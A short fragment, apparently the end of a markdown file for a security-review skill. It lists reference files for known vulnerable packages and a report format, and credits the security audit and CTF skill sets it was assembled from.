- `references/vulnerable-packages.md` — 已知漏洞套件清單
- `references/report-format.md` — 報告格式模板

---

*Generated by integrating: Security Review, Sharp Edges, Insecure Defaults, Security Audit, CTF Web, CTF Pwn, CTF Crypto, CTF Forensics, CTF Reverse Skills*
